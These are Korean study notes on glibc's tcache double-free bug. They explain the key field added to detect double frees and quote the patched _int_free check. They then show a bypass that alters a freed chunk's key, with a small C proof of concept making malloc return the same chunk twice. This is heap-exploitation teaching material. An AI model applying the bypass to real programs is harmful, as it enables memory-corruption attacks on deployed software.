# 🧠 Double Free Bug
`tcahce`와 `bins`를 free list라 통칭한다면, free list 관점에서
`free`는 chunk를 추가하는 함수, `malloc`은 청크를 꺼내는 함수
임의 청크에 대해 `free`를 두 번 이상 적용 = 같은 청크를 free list에 여러 번 추가 가능
duplicated free list를 이용하면 임의 주소에 청크를 할당할 수 있음

## 📌 Definition
DFB = 같은 청크를 두 번 해체할 수 있는 버그

---

## 📄 Mitigation for Tcache DFB
### 1. tcache_entry
```c
typedef struct tcache_entry {
  struct tcache_entry *next;
+ /* This field exists to detect double frees.  */
+ struct tcache_perthread_struct *key;
} tcache_entry;
```
패치된 코드의 `diff`를 보면 double free를 탐지하기 위해 `key`포인터가 추가됨
bin과의 차이점은 다음과 같다.
```text
bin (doubly linked list)
→ 중간 삽입/삭제 필요
→ fd, bk 둘 다 필요

tcache (singly linked list, LIFO)
→ head에서만 push/pop
→ bk 필요 없음
→ 그 자리를 key로 재활용해서 double free 탐지에 사용
```
### 2. tcahce_put
```c
tcache_get (size_t tc_idx)
   assert (tcache->entries[tc_idx] > 0);
   tcache->entries[tc_idx] = e->next;
   --(tcache->counts[tc_idx]);
+  e->key = NULL;
   return (void *) e;
 }
```
재사용하는 청크의 `key`값에 NULL을 대입

### 3._int_free
```c
_int_free (mstate av, mchunkptr p, int have_lock)
 #if USE_TCACHE
    {
     size_t tc_idx = csize2tidx (size);
-
-    if (tcache
-       && tc_idx < mp_.tcache_bins
-       && tcache->counts[tc_idx] < mp_.tcache_count)
+    if (tcache != NULL && tc_idx < mp_.tcache_bins)
       {
-       tcache_put (p, tc_idx);
-       return;
+       /* Check to see if it's already in the tcache.  */
+       tcache_entry *e = (tcache_entry *) chunk2mem (p);
+
+       /* This test succeeds on double free.  However, we don't 100%
+          trust it (it also matches random payload data at a 1 in
+          2^<size_t> chance), so verify it's not an unlikely
+          coincidence before aborting.  */
+       if (__glibc_unlikely (e->key == tcache))
+         {
+           tcache_entry *tmp;
+           LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
+           for (tmp = tcache->entries[tc_idx];
+                tmp;
+                tmp = tmp->next)
+             if (tmp == e)
+               malloc_printerr ("free(): double free detected in tcache 2");
+           /* If we get here, it was a coincidence.  We've wasted a
+              few cycles, but don't abort.  */
+         }
+
+       if (tcache->counts[tc_idx] < mp_.tcache_count)
+         {
+           tcache_put (p, tc_idx);
+           return;
+         }
       }
   }
  #endif
```
청크를 해제할 떄 호출하는 함수인 `_int_free`를 보면    
`if (__glibc_unlikely (e->key == tcache))`에서 재할당하려는 청크의 `key`값이 `tcahce`인 경우
double free가 발생했다고 보고 프로그램을 abort 시킴.

간단하게 정리하면
```text
key == NULL  → "지금 할당되어 사용 중인 상태" → free해도 안전
key == tcache → "이미 tcache 안에 들어있는 상태" → 또 free하면 DFB
```
---

## 📄 우회기법
`if (__glibc_unlikely (e->key == tcache))`만 통과하면 dobule free 가능
```c
+       /* This test succeeds on double free.  However, we don't 100%
+          trust it (it also matches random payload data at a 1 in
+          2^<size_t> chance), so verify it's not an unlikely
+          coincidence before aborting.  */
+       if (__glibc_unlikely (e->key == tcache)) // Bypass it!
+         {
+           ...
+             if (tmp == e)
+               malloc_printerr ("free(): double free detected in tcache 2");
+         }
+           ...
+       if (tcache->counts[tc_idx] < mp_.tcache_count)
+         {
+           tcache_put (p, tc_idx);
+           return;
+         }
       }
```
다시 말해, 해제된 청크의 key값을 1비트만이라도 바꿀 수 있으면 우회가 가능

---

## 📄 Tcache Duplication
```c
// Name: tcache_dup.c
// Compile: gcc -o tcache_dup tcache_dup.c

#include <stdio.h>
#include <stdlib.h>

int main() {
  void *chunk = malloc(0x20);
  printf("Chunk to be double-freed: %p\n", chunk);

  free(chunk);

  *(char *)(chunk + 8) = 0xff;  // manipulate chunk->key
  free(chunk);                  // free chunk in twice

  printf("First allocation: %p\n", malloc(0x20));
  printf("Second allocation: %p\n", malloc(0x20));

  return 0;
}
```
이를 컴파일 하고 실행하면
```bash
$ ./tcache_dup
Chunk to be double-freed: 0x55d4db927260
First allocation: 0x55d4db927260
Second allocation: 0x55d4db927260
```
이므로 `chunck`가 `tcache`에 중복 연결되어 연속으로 재할당됨

---

## ✅ Key Takeaways
해제된 청크의 key값을 1비트만이라도 바꿀 수 있으면 우회가 가능!
